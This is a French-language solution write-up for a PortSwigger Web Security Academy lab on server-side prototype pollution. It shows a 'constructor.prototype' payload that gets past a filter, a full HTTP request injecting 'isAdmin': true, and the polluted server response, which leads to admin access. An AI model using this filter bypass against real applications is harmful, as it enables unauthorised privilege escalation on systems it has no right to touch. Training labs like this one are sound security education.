# Lab

https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution

## Solution

Si on essaie la même attaque que pour le lab précédent, on obtient une réponsemais la pollution de prototype n'a pas fonctionné.

On va donc essayer de trouver une autre manière de polluer le prototype.

par exemple avec : 

```json
{
    "constructor": {
        "prototype": {
            "foo": "bar"
        }
    }
}
```

Mais dans la réponse on nous dit qu'il manque le sessionID : `{"message":"Session id not supplied."}`

En renseignant le sessionID dans le cookie, on obtient bien une réponse avec le paramètre pollué :

```http
POST /my-account/change-address HTTP/2
Host: 0a23004e037298f98157894a002c00f8.web-security-academy.net
Cookie: session=PDdvDBpn3H5rnEu9CAj9q78NGldIJQqe
Content-Length: 241
Content-Type: application/json;charset=UTF-8

{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "PDdvDBpn3H5rnEu9CAj9q78NGldIJQqe",
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

Et dans la réponse on voit bien le paramètre pollué :

```json
{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": true,
  "foo": "bar"
}
```

Maintenant on peut polluer le paramètre `isAdmin` pour avoir un accès admin et un accès au panel d'administation pour supprimer le compte de `carlos`.